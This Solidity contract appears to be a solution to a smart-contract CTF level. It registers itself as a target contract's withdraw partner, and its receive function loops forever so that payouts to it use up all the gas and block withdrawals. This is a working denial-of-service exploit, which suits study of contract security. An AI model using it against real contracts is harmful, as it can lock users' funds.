// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract Solving {

    function solve(address _victim) external {
        _victim.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
    }

    receive() external payable {
        while (true) {}
    }
}
